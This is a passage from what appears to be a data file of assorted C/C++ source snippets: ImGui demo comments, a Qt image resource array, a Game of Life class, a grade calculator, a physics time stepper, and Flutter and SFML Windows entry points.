game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example A",
    "/****************************************************************************\n** Resource object code\n**\n** Created by: The Resource Compiler for Qt version 6.7.0\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\nstatic const unsigned char qt_resource_data[] = {\n  // D:/codes/qt/02_project/res/first_page(2).jpg\n  0x0,0x0,0xbb,0x89,\n  0xff,\n  0xd8,0xff,0xe0,0x0,0x10,0x4a,0x46,0x49,0x46,0x0,0x1,0x1,0x1,0x0,0x60,0x0,\n  0x60,0x0,0x0,0xff,0xdb,0x0,0x43,0x0,0x6,0x4,0x5,0x6,0x5,0x4,0x6,0x6,\n  0x5,0x6,0x7,0x7,0x6,0x8,0xa,0x10,0xa,0xa,0x9,0x9,0xa,0x14,0xe,0xf,\n  0xc,0x10,0x17,0x14,0x18,0x18,0x17,0x14,0x16,0x16,0x1a,0x1d,0x25,0x1f,0x1a,0x1b,\n  0x23,0x1c,0x16,0x16,0x20,0x2c,0x20,0x23,0x26,0x27,0x29,0x2a,0x29,0x19,0x1f,0x2d,\n  0x30,0x2d,0x28,0x30,0x25,0x28,0x29,0x28,0xff,0xdb,0x0,0x43,0x1,0x7,0x7,0x7,\n  0xa,0x8,0xa,0x13,0xa,0xa,0x13,0x28,0x1a,0x16,0x1a,0x28,0x28,0x28,0x28,0x28,\n  0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,\n  0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,\n  0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0x28,0xff,0xc0,0x0,\n  0x11,0x8,0x1,0xfa,0x3,0x84,0x3,0x1,0x22,0x0,0x2,0x11,0x1,0x3,0x11,0x1,\n  0xff,0xc4,0x0,0x1f,0x0,0x0,0x1,0x5,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xa,\n  0xb,0xff,0xc4,0x0,0xb5,0x10,0x0,0x2,0x1,0x3,0x3,0x2,0x4,0x3,0x5,0x5,\n  0x4,0x4,0x0,0x0,0x1,0x7d,0x1,0x2,0x3,0x0,0x4,0x11,0x5,0x12,0x21,0x31,\n  0x41,0x6,0x13,0x51,0x61,0x7,0x22,0x71,0x14,0x32,0x81,0x91,0xa1,0x8,0x23,0x42,\n  0xb1,0xc1,0x15,0x52,0xd1,0xf0,0x24,0x33,0x62,0x72,0x82,0x9,0xa,0x16,0x17,0x18,\n  0x19,0x1a,0x25,0x26,0x27,0x28,0x29,0x2a,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x43,\n  0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x63,\n  0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,0x83,\n  0x84,0x85,0x86,0x87,0x88,0x89,0x8a,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9a,\n  0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xb2,0xb3,0xb4,0xb5,0xb6,0xb7,0xb8,\n  0xb9,0xba,0xc2,0xc3,0xc4,0xc5,0xc6,0xc7,0xc8,0xc9,0xca,0xd2,0xd3,0xd4,0xd5,0xd6,\n  0xd7,0xd8,0xd9,0xda,0xe1,0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xf1,0xf2,\n  0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,0xff,0xc4,0x0,0x1f,0x1,0x0,0x3,0x1,\n  0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x2,\n  0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xa,0xb,0xff,0xc4,0x0,0xb5,0x11,0x0,0x2,\n  0x1,0x2,0x4,0x4,0x3,0x4,0x7,0x5,0x4,0x4,0x0,0x1,0x2,0x77,0x0,0x1,\n  0x2,0x3,0x11,0x4,0x5,0x21,0x31,0x6,0x12,0x41,0x51,0x7,0x61,0x71,0x13,0x22,\n  0x32,0x81,0x8,0x14,0x42,0x91,0xa1,0xb1,0xc1,0x9,0x23,0x33,0x52,0xf0,0x15,0x62,\n  0x72,0xd1,0xa,0x16,0x24,0x34,0xe1,0x25,0xf1,0x17,0x18,0x19,0x1a,0x26,0x27,0x28,\n  0x29,0x2a,0x35,0x36,0x37,0x38,0x39,0x3a,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,\n  0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,\n  0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,\n  0x8a,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9a,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,\n  0xa8,0xa9,0xaa,0xb2,0xb3,0xb4,0xb5,0xb6,0xb7,0xb8,0xb9,0xba,0xc2,0xc3,0xc4,0xc5,\n  0xc6,0xc7,0xc8,0xc9,0xca,0xd2,0xd3,0xd4,0xd5,0xd6,0xd7,0xd8,0xd9,0xda,0xe2,0xe3,\n  0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,\n  0xff,0xda,0x0,0xc,0x3,0x1,0x0,0x2,0x11,0x3,0x11,0x0,0x3f,0x0,0xeb,0xf0,\n  0x69,0x1b,0x2b,0xd6,0x97,0xce,0xf6,0xa6,0xca,0xfb,0x87,0x4a,0xf9,0x9b,0x9e,0xd5,\n  0x85,0xc8,0xa3,0x2b,0x51,0x60,0xe2,0x93,0x14,0x5c,0x2c,0x4d,0x95,0xa3,0x2b,0xda,\n  0xa1,0xc5,0x18,0xa2,0xe1,0x62,0x5d,0xc2,0x8d,0xc2,0xa2,0xc0,0xf7,0xa3,0x3,0xde,\n  0x95,0xc2,0xc8,0x9b,0x70,0xf5,0xa3,0x70,0xf5,0xa8,0x7a,0x7a,0xd1,0x9f,0xad,0x17,\n  0xe,0x54,0x4d,0x91,0xeb,0x40,0x20,0xf4,0x35,0xe,0x7e,0xb4,0xab,0x90,0x73,0x83,\n  0x45,0xc3,0x94,0x9f,0x69,0xfa,0xd3,0x5d,0x58,0xaf,0x2,0x9c,0xb2,0x13,0x8e,0x2a,\n  0x5e,0xd4,0x5c,0x7c,0xa8,0xab,0xb1,0xfd,0xd,0x1b,0x1f,0xd0,0xd5,0xaa,0x29,0xe,\n  0xc8,0xab,0xb1,0xfd,0xd,0x1e,0x5b,0x7a,0x1a,0xb5,0x4b,0xf9,0xd0,0x3b,0x22,0xa7,\n  0x96,0xde,0x86,0x93,0xcb,0x7f,0x43,0x57,0x3f,0x3a,0x3f,0x3a,0x3,0x94,0xa7,0xe5,\n  0xbf,0xf7,0x4d,0x1e,0x5b,0xff,0x0,0x74,0xd5,0xcf,0xce,0x8f,0xce,0x80,0xb1,0x4f,\n  0xcb,0x7f,0xee,0x9a,0x5f,0x2d,0xbd,0xd,0x5b,0xa4,0xa0,0x2c,0x55,0xf2,0xdb,0xd0,\n  0xd2,0x79,0x6d,0xfd,0xd3,0x56,0xf3,0x46,0x33,0xeb,0x40,0x58,0xab,0xe5,0xb7,0xa1,\n  0xa7,0x8,0xc7,0x70,0x6a,0xc5,0x1f,0x85,0x1,0x62,0xbf,0x96,0x3d,0xff,0x0,0x3a,\n  0x3c,0xb1,0xef,0xf9,0xd5,0x8f,0xca,0x8f,0xca,0x80,0xb1,0x5f,0xcb,0x5f,0x7f,0xce,\n  0x97,0x62,0xfb,0xd4,0xd8,0xa5,0xe3,0xd2,0x81,0x58,0x83,0xcb,0x5a,0x3c,0xb5,0xa9,\n  0xf8,0xf4,0xa3,0x8f,0x4a,0x2c,0x16,0x20,0xf2,0xd6,0x8f,0x2d,0x6a,0x7c,0x8f,0x4a,\n  0x32,0x3d,0x29,0xd8,0x76,0x20,0xf2,0xd7,0xfc,0x9a,0x4,0x4b,0xfe,0x4d,0x4f,0xf4,\n  0xa2,0x90,0xac,0x41,0xe5,0xa7,0xbd,0x6,0x35,0xf7,0xa9,0xbf,0x1,0x47,0xe5,0x40,\n  0x58,0x84,0x22,0x8f,0x5a,0x7e,",
    "#include \"Gol.h\"\n\nsize_t Gol::get_num_neighbors(size_t x, size_t y) const {\n    if (x >= this->horizontal_size || y >= this->vertical_size)\n        throw std::runtime_error(\"Cell out of bounds line:\" +\n                                 std::to_string(__LINE__));\n\n    size_t neighbor_start_x = (x != 0)              ? x - 1\n                              : (this->wrap_around) ? this->horizontal_size - 1\n                                                    : 0;\n    size_t neighbor_start_y = (y != 0)              ? y - 1\n                              : (this->wrap_around) ? this->vertical_size - 1\n                                                    : 0;\n    size_t neighbor_end_x = (x < (this->horizontal_size - 1)) ? x + 1\n                            : (this->wrap_around)             ? 0\n                                                              : x;\n    size_t neighbor_end_y = (y < (this->vertical_size - 1)) ? y + 1\n                            : (this->wrap_around)           ? 0\n                                                            : y;\n    size_t num_neighbors = 0;\n    size_t neighbor_y = neighbor_start_y;\n    while (neighbor_y != (neighbor_end_y + 1) % this->vertical_size) {\n        size_t neighbor_x = neighbor_start_x;\n        while (neighbor_x != (neighbor_end_x + 1) % this->horizontal_size) {\n            if (neighbor_x == x && neighbor_y == y) {\n                neighbor_x = (neighbor_x + 1) % this->horizontal_size;\n                continue;\n            }\n            if (get_cell(neighbor_x, neighbor_y)) num_neighbors++;\n            neighbor_x = (neighbor_x + 1) % this->horizontal_size;\n        }\n        neighbor_y = (neighbor_y + 1) % this->vertical_size;\n    }\n    return num_neighbors;\n}\n\nbool Gol::should_be_alive(size_t x, size_t y) const {\n    if (x >= this->horizontal_size || y >= this->vertical_size)\n        throw std::runtime_error(\"Cell out of bounds line\" +\n                                 std::to_string(__LINE__));\n    const size_t num_neighbors = get_num_neighbors(x, y);\n    if (get_cell(x, y)) {\n        if (num_neighbors > this->alive_high || num_neighbors < this->alive_low)\n            return false;\n        return true;\n    } else {\n        if (num_neighbors > this->reproduction_high ||\n            num_neighbors < reproduction_low)\n            return false;\n        return true;\n    }\n}\n\nvoid Gol::set_cell(bool alive, size_t x, size_t y) {\n    if (x >= this->horizontal_size || y >= this->vertical_size)\n        throw std::runtime_error(\"Cell out of bounds line: \" +\n                                 std::to_string(__LINE__));\n    this->cells_inactive[x + y * horizontal_size] = alive;\n    return;\n}\n\nbool Gol::get_cell(size_t x, size_t y) const {\n    if (x >= this->horizontal_size || y >= this->vertical_size)\n        throw std::runtime_error(\"Cell out of bounds line: \" +\n                                 std::to_string(__LINE__));\n    return this->cells_active[x + y * horizontal_size];\n}\n\nGol::Gol(size_t horizontal_size, size_t vertical_size, std::string starting_file_path)\n    : horizontal_size(horizontal_size), vertical_size(vertical_size) {\n    this->cells_active = new bool[horizontal_size * vertical_size]{0};\n    this->cells_inactive = new bool[horizontal_size * vertical_size]{0};\n    if(starting_file_path != \"\"){\n        init_field_RLE(starting_file_path);\n    }\n    else init_field_random(20);\n}\n\nGol::~Gol() {\n    delete[] cells_active;\n    delete[] cells_inactive;\n}\n\nvoid Gol::init_field_random(unsigned char alive_chance_procent, size_t seed) {\n    srand(seed);\n    for (size_t y = 0; y < this->vertical_size; y++) {\n        for (size_t x = 0; x < this->horizontal_size; x++) {\n            set_cell(rand() % 100 < alive_chance_procent, x, y);\n        }\n    }\n    std::swap(this->cells_active, this->cells_inactive);\n}\n\nvoid Gol::init_field_RLE(std::string filepath){\n    std::ifstream input_file(filepath);\n    if(!input_file.is_open()) throw std::runtime_error(\"Failed to get file\");\n    std::string currentInput;\n    static const size_t x_start = 75;\n    static const size_t y_start = 20;\n    size_t x = x_start;\n    size_t y = y_start;\n    while(input_file >> currentInput){\n        for (size_t i = 0; i < currentInput.size(); i++)\n        {\n            std::string number_string = \"\";\n            while(currentInput[i] <= '9' && currentInput[i] >= '0'){\n                number_string += currentInput[i];\n                i++;\n            }\n            size_t cellcount = (number_string != \"\") ? std::stoul(number_string) : 1;\n            switch (currentInput[i]){\n                case 'o':\n                    for (size_t j = 0; j < cellcount; j++)\n                    {\n                        set_cell(true, x++, y);\n                        if(x >= this->horizontal_size) throw std::runtime_error(\"Board too small horizontal: \" + std::to_string(__LINE__));\n                    }\n                    break;\n                case 'b':\n                    for (size_t j = 0; j < cellcount; j++)\n                    {\n",
    "\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include \"clsInputValidate.h\"\r\n#include<iomanip>\r\n\r\nusing namespace std;\r\n\r\n\r\nconst string BultaneFileName = \"AverageResultOfYearData.txt\";\r\n\r\nstruct stMatierData\r\n{\r\n    string NameMatier = \"\";\r\n    int NumExamInMatier = 0;\r\n    vector<float> NotesInExamInMatier = {};\r\n    bool HaveAttentionInMatier = 0;\r\n    float NoteAttention = 0;\r\n    short PercentageAttention = 0;\r\n    short NumCoefficientInMatier = 0;\r\n    float AverageMatier = 0;\r\n    float AverageMultiplyCoefficient = 0;\r\n};\r\n\r\nstruct stBultaneTotals\r\n{\r\n    int TotalCoefficient = 0;\r\n    float TotalAverageMultiplyCoefficient = 0;\r\n};\r\n\r\nvector <string> SplitString(string S1, string Delim)\r\n{\r\n\r\n    vector<string> vString;\r\n\r\n    short pos = 0;\r\n    string sWord; // define a string variable  \r\n\r\n    // use find() function to get the position of the delimiters  \r\n    while ((pos = S1.find(Delim)) != std::string::npos)\r\n    {\r\n        sWord = S1.substr(0, pos); // store the word   \r\n        if (sWord != \"\")\r\n        {\r\n            vString.push_back(sWord);\r\n        }\r\n\r\n        S1.erase(0, pos + Delim.length());  // erase() until positon and move to next word. \r\n    }\r\n\r\n    if (S1 != \"\")\r\n    {\r\n        vString.push_back(S1); // it adds last word of the string.\r\n    }\r\n\r\n    return vString;\r\n\r\n}\r\n\r\nstMatierData ConvertLineToRecord(string Line, string Separator = \"#//#\")\r\n{\r\n    stMatierData MatierData;\r\n    vector <string> vMatierData;\r\n\r\n    vMatierData = SplitString(Line, Separator);\r\n\r\n    MatierData.NameMatier = vMatierData[0];\r\n    MatierData.NumExamInMatier = stoi(vMatierData[1]);\r\n\r\n    MatierData.NotesInExamInMatier.resize(MatierData.NumExamInMatier);\r\n\r\n    for (short i = 0; i < MatierData.NumExamInMatier; i++)\r\n    {\r\n        MatierData.NotesInExamInMatier[i] = stof(vMatierData[i + 2]);\r\n    }\r\n\r\n    short NumNow = MatierData.NumExamInMatier + 1;\r\n\r\n    MatierData.HaveAttentionInMatier = stoi(vMatierData[++NumNow]);\r\n    MatierData.NoteAttention = stof(vMatierData[++NumNow]);\r\n    MatierData.PercentageAttention = stoi(vMatierData[++NumNow]);\r\n    MatierData.NumCoefficientInMatier = stoi(vMatierData[++NumNow]);\r\n    MatierData.AverageMatier = stof(vMatierData[++NumNow]);\r\n    MatierData.AverageMultiplyCoefficient = stof(vMatierData[++NumNow]);\r\n\r\n\r\n    return MatierData;\r\n}\r\n\r\nstring ConvertRecordToLine(stMatierData Matier, string Separator = \"#//#\")\r\n{\r\n    string stMatierRecord = \"\";\r\n\r\n    stMatierRecord += Matier.NameMatier + Separator;\r\n    stMatierRecord += to_string(Matier.NumExamInMatier) + Separator;\r\n    for (short i = 0; i < Matier.NumExamInMatier; i++)\r\n    {\r\n        stMatierRecord += to_string(Matier.NotesInExamInMatier.at(i)) + Separator;\r\n    }\r\n    stMatierRecord += to_string(Matier.HaveAttentionInMatier) + Separator;\r\n    stMatierRecord += to_string(Matier.NoteAttention) + Separator;\r\n    stMatierRecord += to_string(Matier.PercentageAttention) + Separator;\r\n    stMatierRecord += to_string(Matier.NumCoefficientInMatier) + Separator;\r\n    stMatierRecord += to_string(Matier.AverageMatier) + Separator;\r\n    stMatierRecord += to_string(Matier.AverageMultiplyCoefficient);\r\n\r\n    return stMatierRecord;\r\n}\r\n\r\nvoid AddDataToLineToFile(string FileName, string stDataLine)\r\n{\r\n    fstream MatierData;\r\n    MatierData.open(FileName, ios::out | ios::app);\r\n\r\n    if (MatierData.is_open())\r\n    {\r\n        MatierData << stDataLine << endl;\r\n\r\n        MatierData.close();\r\n    }\r\n\r\n}\r\n\r\nvoid DeleteDataFromFile()\r\n{\r\n    fstream MatierData;\r\n    MatierData.open(BultaneFileName, ios::out);\r\n\r\n    if (MatierData.is_open())\r\n    {\r\n        MatierData.close();\r\n    }\r\n}\r\n\r\nvector <stMatierData> LoadMatiersDataFromFile(string FileName, stBultaneTotals& BultaneTotal)\r\n{\r\n    vector <stMatierData> vMatiers;\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::in);\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n        string Line;\r\n        stMatierData Matier;\r\n\r\n        while (getline(MyFile, Line))\r\n        {\r\n            Matier = ConvertLineToRecord(Line);\r\n\r\n            BultaneTotal.TotalCoefficient += Matier.NumCoefficientInMatier;\r\n            BultaneTotal.TotalAverageMultiplyCoefficient += Matier.AverageMultiplyCoefficient;\r\n\r\n            vMatiers.push_back(Matier);\r\n        }\r\n\r\n        MyFile.close();\r\n    }\r\n    return vMatiers;\r\n}\r\n\r\nstring ReadString()\r\n{\r\n    string  S1 = \"\";\r\n    // Usage of std::ws will extract allthe whitespace character\r\n    getline(cin >> ws, S1);\r\n    return S1;\r\n}\r\n\r\nvector <float> ReadQuizNote(short NumQuizInMatier, string NameMatier)\r\n{\r\n    vector <float> NotesInExamInMatier;\r\n\r\n    for (short i = 1; i <= NumQuizInMatier; i++)\r\n    {\r\n        cout << \"Please Enter Note \" + to_string(i) + \" In \" + NameMatier + \" : \";\r\n        NotesInExamInMatier.push_back(clsInputValidate<float>::ReadNumberBetween(0, 20, \"Error, Please Enter Note \" + to_string(i) + \" In \" + NameMatier + \" : \"));\r\n        cout << \"\\n\";\r\n\r\n    }\r\n\r\n    return NotesInExamInMat",
    "#include <iostream>\n\nusing namespace std;\n\nclass Person\n{\n    private:\n    int id;\n    string name;\n    int age;\n    string address;\n    public:\n    Person(){}\n    Person(int id, string name, int age, string address)\n    {\n        this->name = name;\n        this->age = age;\n        this-> id = id;\n        this->address = address;\n    }\n    void setId(int id)\n    {   \n        this->id = id;\n    }\n    int getId()\n    {\n        return this->id;\n    }\n    void setName(string name)\n    {\n        this->name = name;\n    }\n    string getName()\n    {\n        return this->name;\n    }\n    void setAddress(string address)\n    {\n        this->address = address;\n    }\n    string getAddress()\n    {\n        return this->address;\n    }\n    void setAge(int age)\n    {\n        this->age = age;\n    }\n    int getAge()\n    {\n        return this->age;\n    }\n};\n\nint main()\n{\n\tPerson p(1001, \"Quynh\", 24, \"Ha Noi\");\n\tcout << \"Id: \" << p.getId() << endl;\n\tcout << \"Name: \" << p.getName() << endl;\n\tcout << \"Age: \" << p.getAge() << endl;\n\tcout << \"Address: \" << p.getAddress() << endl;\n\treturn 0;\n}",
    "#include \"timeStepper.h\"\n\ntimeStepper::timeStepper(elasticRod &m_rod)\n{\n\trod = &m_rod;\n\tkl = 10; // lower diagonals\n\tku = 10; // upper diagonals\n\tfreeDOF = rod->uncons;\n\tldb = freeDOF;\n\tNUMROWS = 2 * kl + ku + 1;\n\ttotalForce = new double[freeDOF];\n\tjacobianLen = (2 * kl + ku + 1) * freeDOF;\n\tjacobian = new double [jacobianLen];\n\tnrhs = 1;\n    ipiv = new int[freeDOF];\n    info = 0;\n\n    /*\n\n    ForceVector.setZero(freeDOF, 1);\n    VectorMotion.setZero(freeDOF, 1);\n\n    JacobianMatrix.resize(freeDOF, freeDOF);\n\n    */\n}\n\ntimeStepper::~timeStepper()\n{\n\t;\n}\n\ndouble* timeStepper::getForce()\n{\n\treturn totalForce;\n}\n\ndouble* timeStepper::getJacobian()\n{\n\treturn jacobian;\n}\n\nvoid timeStepper::addForce(int ind, double p)\n{\n\tif (rod->getIfConstrained(ind) == 0) // free dof\n\t{\n\t\tmappedInd = rod->fullToUnconsMap[ind];\n\t\ttotalForce[mappedInd] = totalForce[mappedInd] + p; // subtracting elastic force\n\n\t\t//ForceVector(mappedInd) = ForceVector(mappedInd) + p;\n\t}\n}\n\nvoid timeStepper::addJacobian(int ind1, int ind2, double p)\n{\n\tmappedInd1 = rod->fullToUnconsMap[ind1];\n\tmappedInd2 = rod->fullToUnconsMap[ind2];\n\tif (rod->getIfConstrained(ind1) == 0 && rod->getIfConstrained(ind2) == 0 && p != 0) // both are free\n\t{\n\t\trow = kl + ku + mappedInd2 - mappedInd1;\n        col = mappedInd1;\n        offset = row + col * NUMROWS;\n        jacobian[offset] = jacobian[offset] + p;\n\n        //JacobianMatrix.coeffRef(mappedInd2, mappedInd1) += p;\n\t}\n}\n\nvoid timeStepper::setZero()\n{\n\tfor (int i=0; i < freeDOF; i++)\n\t\ttotalForce[i] = 0;\n\tfor (int i=0; i < jacobianLen; i++)\n\t\tjacobian[i] = 0;\n\n\t/*\n\n\tForceVector.setZero(freeDOF, 1);\n    VectorMotion.setZero(freeDOF, 1);\n\n    JacobianMatrix.setZero();\n\n    */\n}\n\nvoid timeStepper::integrator()\n{\n\n\tdgbsv_(&freeDOF, &kl, &ku, &nrhs, jacobian, &NUMROWS, ipiv, totalForce, &ldb, &info);\n\n\n\t/*\n\n\tConjugateGradient<SparseMatrix<double>, Lower|Upper> cg;\n    cg.compute(JacobianMatrix);\n    VectorMotion = cg.solve(ForceVector);\n\n    for (int i=0; i < freeDOF; i++)\n    {\n\t\ttotalForce[i] = VectorMotion(i);\n    }\n\n    */\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"complete_flutter_course\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <windows.h>\n#include <cmath>\n\nHWND button;\n\n\n////////////////////////////////////////////////////////////\n/// Function called whenever one of our windows receives a message\n///\n////////////////////////////////////////////////////////////\nLRESULT CALLBACK onEvent(HWND handle, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n        // Quit when we close the main window\n        case WM_CLOSE:\n        {\n            PostQuitMessage(0);\n            return 0;\n        }\n\n        // Quit when we click the \"quit\" button\n        case WM_COMMAND:\n        {\n            if (reinterpret_cast<HWND>(lParam) == button)\n            {\n                PostQuitMessage(0);\n                return 0;\n            }\n        }\n    }\n\n    return DefWindowProc(handle, message, wParam, lParam);\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\param Instance: Instance of the application\n///\n/// \\return Error code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    HINSTANCE instance = GetModuleHandle(NULL);\n\n    // Define a class for our main window\n    WNDCLASS windowClass;\n    windowClass.style         = 0;\n    windowClass.lpfnWndProc   = &onEvent;\n    windowClass.cbClsExtra    = 0;\n    windowClass.cbWndExtra    = 0;\n    windowClass.hInstance     = instance;\n    windowClass.hIcon         = NULL;\n    windowClass.hCursor       = 0;\n    windowClass.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BACKGROUND);\n    windowClass.lpszMenuName  = NULL;\n    windowClass.lpszClassName = TEXT(\"SFML App\");\n    RegisterClass(&windowClass);\n\n    // Let's create the main window\n    HWND window = CreateWindow(TEXT(\"SFML App\"), TEXT(\"SFML Win32\"), WS_SYSMENU | WS_VISIBLE, 200, 200, 660, 520, NULL, NULL, instance, NULL);\n\n    // Add a button for exiting\n    button = CreateWindow(TEXT(\"BUTTON\"), TEXT(\"Quit\"), WS_CHILD | WS_VISIBLE, 560, 440, 80, 40, window, NULL, instance, NULL);\n\n    // Let's create two SFML views\n    HWND view1 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 20,  20, 300, 400, window, NULL, instance, NULL);\n    HWND view2 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 340, 20, 300, 400, window, NULL, instance, NULL);\n    sf::RenderWindow SFMLView1(view1);\n    sf::RenderWindow SFMLView2(view2);\n\n    // Load some textures to display\n    sf::Texture texture1, texture2;\n    if (!texture1.loadFromFile(\"resources/image1.jpg\") || !texture2.loadFromFile(\"resources/image2.jpg\"))\n        return EXIT_FAILURE;\n    sf::Sprite sprite1(texture1);\n    sf::Sprite sprite2(texture2);\n    sprite1.setOrigin(sf::Vector2f(texture1.getSize()) / 2.f);\n    sprite1.setPosition(sprite1.getOrigin());\n\n    // Create a clock for measuring elapsed time\n    sf::Clock clock;\n\n    // Loop until a WM_QUIT message is received\n    MSG message;\n    message.message = static_cast<UINT>(~WM_QUIT);\n    while (message.message != WM_QUIT)\n    {\n        if (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))\n        {\n            // If a message was waiting in the message queue, process it\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n        }\n        else\n        {\n            float time = clock.getElapsedTime().asSeconds();\n\n            // Clear views\n            SFMLView1.clear();\n            SFMLView2.clear();\n\n            // Draw sprite 1 on view 1\n            